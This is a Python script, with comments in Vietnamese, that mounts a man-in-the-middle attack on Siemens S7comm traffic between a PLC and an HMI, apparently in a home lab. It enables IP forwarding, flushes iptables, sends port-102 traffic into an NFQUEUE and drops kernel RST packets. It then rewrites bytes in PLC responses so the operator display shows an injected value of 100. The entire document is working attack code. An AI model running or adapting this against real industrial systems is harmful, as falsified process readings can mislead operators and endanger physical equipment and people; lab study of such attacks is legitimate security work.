import os
import sys
import time
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

# --- CẤU HÌNH THÔNG SỐ (Sửa cho khớp với Lab của ông) ---
PLC_IP = "192.168.50.10"        # IP của PLC
PLC_NET = "192.168.50.0/24"     # Dải mạng của PLC
GATEWAY = "192.168.60.1"        # IP của Router/Gateway phía HMI
INTERFACE = "ens33"             # Card mạng dải .60
VALUE_TO_INJECT = 100           # Giá trị muốn ép HMI hiển thị
QUEUE_NUM = 1

def process_packet(packet):
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(Raw):
            payload = bytearray(scapy_pkt[Raw].load)
            
            # Nhận diện S7comm: TPKT(0x03) -> COTP -> S7 Header(0x32)
            if len(payload) > 7 and payload[0] == 0x03:
                # Tính toán S7 Offset dựa trên COTP Length
                cotp_len = payload[4] + 1
                s7_offset = 4 + cotp_len
                
                if s7_offset < len(payload) and payload[s7_offset] == 0x32:
                    # Chỉ can thiệp gói Response (Len 29) từ PLC gửi về HMI
                    if len(payload) == 29 and scapy_pkt[IP].src == PLC_IP:
                        
                        # Tiêm giá trị: Sửa 2 byte cuối của Data Item (Offset 27, 28)
                        inject = VALUE_TO_INJECT.to_bytes(2, "big", signed=True)
                        payload[27], payload[28] = inject[0], inject[1]
                        
                        # Cập nhật Payload và xóa Checksum để Scapy tự tính lại
                        scapy_pkt[Raw].load = bytes(payload)
                        del scapy_pkt[IP].chksum
                        del scapy_pkt[TCP].chksum
                        
                        packet.set_payload(bytes(scapy_pkt))
                        print(f"===> [SUCCESS] Đã sửa dữ liệu PLC ({PLC_IP}) thành {VALUE_TO_INJECT}")
                        
    except Exception as e:
        print(f"[!] Lỗi logic: {e}")
    
    # Luôn chấp nhận để gói tin đi tiếp
    packet.accept()

def setup_environment():
    print("[*] Đang cấu hình hệ thống (Sysctl, Route, Iptables)...")
    
    # 1. Bật IP Forwarding
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    
    # 2. Tắt RP Filter (Tránh rớt gói tin chiều về từ Router)
    os.system("sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null")
    os.system("sysctl -w net.ipv4.conf.default.rp_filter=0 > /dev/null")
    os.system(f"sysctl -w net.ipv4.conf.{INTERFACE}.rp_filter=0 > /dev/null")
    
    # 3. Thêm Route tới dải PLC thông qua Gateway thật
    print(f"[*] Thêm tuyến đường tới {PLC_NET} qua {GATEWAY}...")
    os.system(f"route add -net {PLC_NET} gw {GATEWAY} 2>/dev/null")
    
    # 4. Cấu hình Iptables
    print("[*] Đang thiết lập Iptables NFQUEUE...")
    os.system("iptables -F")               # Xóa sạch filter table
    os.system("iptables -t mangle -F")      # Xóa sạch mangle table
    os.system("iptables -P FORWARD ACCEPT") # Đảm bảo forward không bị chặn
    
    # Bẫy traffic S7 (Port 102) vào Queue
    os.system(f"iptables -t mangle -A FORWARD -p tcp --port 102 -j NFQUEUE --queue-num {QUEUE_NUM}")
    
    # Chặn gói RST tự phát từ Kernel (Tránh Disconnected)
    os.system("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP")

def cleanup():
    print("\n[*] Đang dọn dẹp hệ thống, khôi phục Iptables...")
    os.system("iptables -F")
    os.system("iptables -t mangle -F")
    os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null")
    print("[*] Hoàn tất dọn dẹp.")

if __name__ == "__main__":
    # Kiểm tra quyền Root
    if os.geteuid() != 0:
        print("[!] Lỗi: Bạn phải chạy script này bằng 'sudo'!")
        sys.exit(1)

    # Chạy cấu hình
    setup_environment()
    
    nfqueue = NetfilterQueue()
    try:
        nfqueue.bind(QUEUE_NUM, process_packet)
        print(f"[*] MITM S7comm đang chạy. Nhấn Ctrl+C để dừng.")
        print(f"[*] Đang đợi traffic từ HMI Fuxa...")
        nfqueue.run()
    except KeyboardInterrupt:
        cleanup()